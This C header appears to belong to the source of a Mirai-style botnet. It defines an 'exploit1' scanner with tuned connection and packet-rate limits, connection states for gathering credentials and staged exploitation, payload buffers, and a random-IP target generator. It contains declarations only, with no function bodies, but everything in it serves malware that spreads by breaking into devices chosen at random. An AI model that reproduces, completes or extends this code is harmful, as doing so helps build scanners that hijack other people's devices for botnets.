#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define exploit1_SCANNER_MAX_CONNS 512
#define exploit1_SCANNER_RAW_PPS 1440
#else
#define exploit1_SCANNER_MAX_CONNS 128
#define exploit1_SCANNER_RAW_PPS 160
#endif
#ifdef X86_64
#define exploit1_SCANNER_RDBUF_SIZE 1024
#define exploit1_SCANNER_HACK_DRAIN 64
#else
#define exploit1_SCANNER_RDBUF_SIZE 256
#define exploit1_SCANNER_HACK_DRAIN 64
#endif

struct exploit1_scanner_connection
{
    int fd, last_recv;
    enum
    {
        exploit1_SC_CLOSED,
        exploit1_SC_CONNECTING,
        exploit1_SC_GET_CREDENTIALS,
        exploit1_SC_exploit1_STAGE2,
        exploit1_SC_exploit1_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[exploit1_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
};

void exploit1_init();
void exploit1_kill(void);

static void exploit1_setup_connection(struct exploit1_scanner_connection *);
static ipv4_t get1_random_ip(void);

